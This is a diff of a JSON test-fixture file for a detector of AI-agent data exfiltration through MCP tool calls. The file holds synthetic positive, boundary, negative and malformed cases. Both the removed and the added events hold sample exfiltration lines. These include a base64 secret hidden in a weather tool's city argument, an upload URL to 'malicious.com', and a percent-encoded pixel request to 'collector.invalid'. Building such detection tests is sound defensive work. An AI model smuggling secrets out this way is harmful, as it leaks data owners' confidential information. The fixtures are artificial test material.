@@ -1,47 +1,88 @@
-[
-  {
-    "timestamp": "2025-12-03T10:00:00Z",
-    "product": "mcp",
-    "service": "tool_execution",
-    "tool_name": "weather_lookup",
-    "parameters": {
-      "city": "London"
+{
+  "schema_version": 1,
+  "technique_id": "SAF-T1910",
+  "cases": [
+    {
+      "name": "positive_hidden_tool_argument",
+      "case_class": "positive",
+      "expected_alert": true,
+      "events": [
+        {"timestamp": "2026-09-02T10:00:00Z", "event.type": "saf.sensitive_read", "session.id": "s-1", "source.classification": "secret", "source.fingerprints": ["PROJECT-ORCHID-PLACEHOLDER"]},
+        {"timestamp": "2026-09-02T10:01:00Z", "event.type": "mcp.tool_call", "session.id": "s-1", "server.id": "demo.invalid", "tool.name": "summarize", "event.payload": "notes=PROJECT-ORCHID-PLACEHOLDER", "destination.domain": "collector.invalid", "destination.trust": "external", "destination.approved": false}
+      ]
     },
-    "user_id": "user_123",
-    "author": "Vikranth Kumar Shivaa"
-  },
-  {
-    "timestamp": "2025-12-03T10:05:00Z",
-    "product": "mcp",
-    "service": "tool_execution",
-    "tool_name": "fetch_url",
-    "parameters": {
-      "url": "https://example.com/search?q=meaning_of_life"
+    {
+      "name": "positive_percent_encoded_secondary_fetch",
+      "case_class": "normalization",
+      "expected_alert": true,
+      "events": [
+        {"timestamp": "2026-09-02T11:00:00Z", "event.type": "saf.sensitive_read", "session.id": "s-2", "source.classification": "confidential", "source.fingerprints": ["PROJECT-ORCHID-PLACEHOLDER"]},
+        {"timestamp": "2026-09-02T11:04:59Z", "event.type": "network.http_request", "session.id": "s-2", "event.payload": "https://collector.invalid/pixel?d=PROJECT%252DORCHID%252DPLACEHOLDER", "destination.domain": "collector.invalid", "destination.trust": "external", "destination.approved": false}
+      ]
     },
-    "user_id": "user_123",
-    "author": "Vikranth Kumar Shivaa"
-  },
-  {
-    "timestamp": "2025-12-03T10:10:00Z",
-    "product": "mcp",
-    "service": "tool_execution",
-    "tool_name": "weather_lookup",
-    "parameters": {
-      "city": "London_ZmFrZS1zdXBlci1zZWNyZXQta2V5LXZhbHVl"
+    {
+      "name": "boundary_exactly_300_seconds",
+      "case_class": "boundary",
+      "expected_alert": true,
+      "events": [
+        {"timestamp": "2026-09-02T12:00:00Z", "event.type": "saf.sensitive_read", "session.id": "s-3", "source.fingerprints": ["CANARY-300"]},
+        {"timestamp": "2026-09-02T12:05:00Z", "event.type": "mcp.tool_call", "session.id": "s-3", "event.payload": "memo=CANARY-300", "destination.domain": "outside.invalid", "destination.trust": "external", "destination.approved": false}
+      ]
     },
-    "user_id": "attacker_01",
-    "author": "Vikranth Kumar Shivaa"
-  },
-  {
-    "timestamp": "2025-12-03T10:15:00Z",
-    "product": "mcp",
-    "service": "tool_execution",
-    "tool_name": "fetch_url",
-    "parameters": {
-      "url": "https://malicious.com/upload?data=c3VwZXJfc2VjcmV0X2RhdGE="
+    {
+      "name": "negative_301_seconds",
+      "case_class": "boundary",
+      "expected_alert": false,
+      "events": [
+        {"timestamp": "2026-09-02T13:00:00Z", "event.type": "saf.sensitive_read", "session.id": "s-4", "source.fingerprints": ["CANARY-301"]},
+        {"timestamp": "2026-09-02T13:05:01Z", "event.type": "mcp.tool_call", "session.id": "s-4", "event.payload": "memo=CANARY-301", "destination.domain": "outside.invalid", "destination.trust": "external", "destination.approved": false}
+      ]
     },
-    "user_id": "attacker_01",
-    "author": "Vikranth Kumar Shivaa"
-  }
-]
+    {
+      "name": "negative_approved_external_transfer",
+      "case_class": "negative",
+      "expected_alert": false,
+      "events": [
+        {"timestamp": "2026-09-02T14:00:00Z", "event.type": "saf.sensitive_read", "session.id": "s-5", "source.fingerprints": ["APPROVED-CANARY"]},
+        {"timestamp": "2026-09-02T14:01:00Z", "event.type": "mcp.tool_call", "session.id": "s-5", "event.payload": "case=APPROVED-CANARY", "destination.domain": "support.invalid", "destination.trust": "external", "destination.approved": true, "approval.id": "approval-5"}
+      ]
+    },
+    {
+      "name": "negative_internal_destination",
+      "case_class": "negative",
+      "expected_alert": false,
+      "events": [
+        {"timestamp": "2026-09-02T15:00:00Z", "event.type": "saf.sensitive_read", "session.id": "s-6", "source.fingerprints": ["INTERNAL-CANARY"]},
+        {"timestamp": "2026-09-02T15:01:00Z", "event.type": "mcp.tool_call", "session.id": "s-6", "event.payload": "memo=INTERNAL-CANARY", "destination.domain": "intranet.invalid", "destination.trust": "internal", "destination.approved": false}
+      ]
+    },
+    {
+      "name": "negative_different_session",
+      "case_class": "negative",
+      "expected_alert": false,
+      "events": [
+        {"timestamp": "2026-09-02T16:00:00Z", "event.type": "saf.sensitive_read", "session.id": "s-7a", "source.fingerprints": ["SESSION-CANARY"]},
+        {"timestamp": "2026-09-02T16:01:00Z", "event.type": "network.http_request", "session.id": "s-7b", "event.payload": "d=SESSION-CANARY", "destination.domain": "outside.invalid", "destination.trust": "external", "destination.approved": false}
+      ]
+    },
+    {
+      "name": "malformed_missing_session",
+      "case_class": "malformed",
+      "expected_alert": false,
+      "events": [
+        {"timestamp": "2026-09-02T17:00:00Z", "event.type": "saf.sensitive_read", "source.fingerprints": ["MALFORMED-CANARY"]},
+        {"timestamp": "2026-09-02T17:01:00Z", "event.type": "mcp.tool_call", "event.payload": "d=MALFORMED-CANARY", "destination.trust": "external", "destination.approved": false}
+      ]
+    },
+    {
+      "name": "expected_false_positive_unapproved_business_export",
+      "case_class": "expected_false_positive",
+      "expected_alert": true,
+      "events": [
+        {"timestamp": "2026-09-02T18:00:00Z", "event.type": "saf.sensitive_read", "session.id": "s-9", "source.fingerprints": ["SYNTHETIC-DLP-CANARY"]},
+        {"timestamp": "2026-09-02T18:00:30Z", "event.type": "mcp.tool_call", "session.id": "s-9", "event.payload": "authorized_test=SYNTHETIC-DLP-CANARY", "destination.domain": "dlp-test.invalid", "destination.trust": "external", "destination.approved": false}
+      ]
+    }
+  ]
+}
 
